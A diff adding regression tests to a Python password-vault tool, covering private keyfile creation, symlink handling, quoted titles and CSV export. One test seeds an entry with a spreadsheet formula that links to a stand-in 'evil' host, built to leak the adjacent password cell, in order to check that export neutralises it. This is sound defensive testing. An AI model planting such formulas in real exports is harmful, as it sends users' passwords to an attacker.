@@ -1,5 +1,6 @@
 """Regression tests for pwvault. Run: python3 -m unittest discover -s tests"""
 
+import csv
 import importlib.util
 import json
 import secrets
@@ -101,6 +102,21 @@ class StorageTests(Base):
         with self.assertRaisesRegex(VaultError, "changed by another"):
             gui.save()
         self.assertIn("From CLI", [e.title for e in self.reopen().kp.entries])
+
+    def test_keyfile_is_created_private_and_never_overwrites(self):
+        kf = self.tmp / "keys" / "new.keyx"
+        pwvault.generate_keyfile(kf)
+        self.assertEqual((len(kf.read_bytes()), kf.stat().st_mode & 0o777), (pwvault.KEYFILE_LEN, 0o600))
+        before = kf.read_bytes()
+        with self.assertRaisesRegex(VaultError, "already exists"):
+            pwvault.generate_keyfile(kf)
+        self.assertEqual(kf.read_bytes(), before)
+        # Regression: a dangling symlink passed the exists() check and the key landed at its target.
+        link, target = self.tmp / "link.keyx", self.tmp / "elsewhere.keyx"
+        link.symlink_to(target)
+        with self.assertRaisesRegex(VaultError, "already exists"):
+            pwvault.generate_keyfile(link)
+        self.assertFalse(target.exists())
 
     def test_create_refuses_to_clobber_existing_file(self):
         self.new_vault()
@@ -205,6 +221,15 @@ class EntryTests(Base):
         v.update_entry(e, {"password": "changed"})  # a real change still archives
         self.assertEqual(len(e.history), 1)
 
+    def test_titles_and_usernames_with_quotes(self):
+        # Regression: pykeepass's XPath duplicate check raised on a double quote, so such entries
+        # couldn't be added (and a CSV import containing one aborted).
+        v = self.new_vault()
+        v.add_entry(v.root, 'Say "hi"', 'o\'brien "x"', "p")
+        v.save()
+        e = self.reopen().entries(query="hi")[0]
+        self.assertEqual((e.title, e.username), ('Say "hi"', 'o\'brien "x"'))
+
     def test_update_keeps_expiry_unless_changed(self):
         v = self.new_vault()
         e = v.entries(query="github")[0]
@@ -285,6 +310,30 @@ class ImportExportTests(Base):
         self.assertNotIn("Binned", (self.tmp / "out.csv").read_text())
         records = pwvault.read_csv_export(self.tmp / "out.csv")  # our CSV re-imports
         self.assertEqual({(r["title"], r["group"]) for r in records}, {("GitHub", "Root"), ("<b>Tag</b>", "Root/Work")})
+
+    def test_csv_export_is_spreadsheet_safe_and_reimports_exactly(self):
+        # A hostile entry must not run as a formula when the export is opened in a spreadsheet.
+        v = Vault.create(self.path, PW)
+        tricky = {"=HYPERLINK(\"http://evil/?\"&D2,\"x\")": "-starts-with-dash", "@SUM(1)": "+plus",
+                  "'=already quoted": "'quote", "plain": "p@ss=word"}
+        for title, password in tricky.items():
+            v.add_entry(v.root, title, "u", password, notes="\tTab start")
+        out = self.tmp / "out.csv"
+        pwvault.export(v, out, "csv")
+        for row in list(csv.reader(out.open(newline="")))[1:]:
+            for cell in row:
+                self.assertFalse(cell.startswith(pwvault.FORMULA_START), cell)
+        restored = {(r["title"], r["password"], r["notes"]) for r in pwvault.read_csv_export(out)}
+        self.assertEqual(restored, {(t, pw, "Tab start") for t, pw in tricky.items()})  # notes are stripped
+
+        pwvault.export(v, out, "csv", raw=True)
+        self.assertIn("-starts-with-dash", out.read_text())
+        self.assertNotIn("'-starts-with-dash", out.read_text())
+
+    def test_foreign_csv_keeps_leading_quotes(self):
+        # Only pwvault's own (escaped) export is unescaped on import.
+        p = self.write_csv("name,url,username,password\nSite,,u,'=not ours\n")
+        self.assertEqual(pwvault.read_csv_export(p)[0]["password"], "'=not ours")
 
     def test_unreadable_csv_is_a_clean_error(self):
         p = self.tmp / "latin1.csv"
